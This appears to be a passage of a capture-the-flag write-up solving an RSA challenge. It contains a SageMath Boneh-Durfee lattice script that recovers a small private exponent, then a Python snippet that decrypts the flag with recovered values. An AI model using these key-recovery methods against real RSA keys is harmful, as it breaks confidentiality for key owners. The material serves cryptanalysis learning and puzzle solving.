    # The problem to solve (edit the following values)
    #
 
    # the modulus
    N = 10037257627154486608196774801095855162090578704439233219876490744017222686494761706171113312036056644757212254824459536550416291797454693336043852190135363
    # the public exponent
    e = 6701513605196718137208327145211106525052740242222174201768345944717813148931274437740087428165253744741547590314279846187850432858954606153257994418035341
 
    # the hypothesis on the private exponent (the theoretical maximum is 0.292)
    delta = .26 # this means that d < N^delta
 
    #
    # Lattice (tweak those values)
    #
 
    # you should tweak this (after a first run), (e.g. increment it until a solution is found)
    m = 4 # size of the lattice (bigger the better/slower)
 
    # you need to be a lattice master to tweak these
    t = int((1-2*delta) * m)  # optimization from Herrmann and May
    X = 2*floor(N^delta)  # this _might_ be too much
    Y = floor(N^(1/2))    # correct if p, q are ~ same size
 
    #
    # Don't touch anything below
    #
 
    # Problem put in equation
    P.<x,y> = PolynomialRing(ZZ)
    A = int((N+1)/2)
    pol = 1 + x * (A + y)
 
    #
    # Find the solutions!
    #
 
    # Checking bounds
    if debug:
        print("=== checking values ===")
        print("* delta:", delta)
        print("* delta < 0.292", delta < 0.292)
        print("* size of e:", int(log(e)/log(2)))
        print("* size of N:", int(log(N)/log(2)))
        print("* m:", m, ", t:", t)
 
    # boneh_durfee
    if debug:
        print("=== running algorithm ===")
        start_time = time.time()
 
    solx, soly = boneh_durfee(pol, e, m, t, X, Y)
 
    # found a solution?
    if solx > 0:
        print("=== solution found ===")
        if False:
            print("x:", solx)
            print("y:", soly)
 
        d = int(pol(solx, soly) / e)
        print("private key found:", d)
    else:
        print("=== no solution was found ===")
 
    if debug:
        print(("=== %s seconds ===" % (time.time() - start_time)))
 
if __name__ == "__main__":
example()
 
最后解一个rsa得到flag
n = 10037257627154486608196774801095855162090578704439233219876490744017222686494761706171113312036056644757212254824459536550416291797454693336043852190135363
c = 6723803125309437675713195914771839852631361554645954138639198200804046718848872479140347495288135138109762940384847808522874831433140182790750890982139835
n1 = 151767047787614712083974720416865469041528766980347881592164779139223941980832935534609228636599644744364450753148219193621511377088383418096756216139022880709
c1 = 6701513605196718137208327145211106525052740242222174201768345944717813148931922063338128366155730924516887607710111701686062781667128443135522927486682574

import gmpy2
from Crypto.Util.number import *

p=647625598040937990477179775340017395831855498212348808173836982264933068647233
q=n1//p
e=c1-p
d=1322874566486382881454604115011030734869
m=pow(c,d,n)
print(long_to_bytes(m))

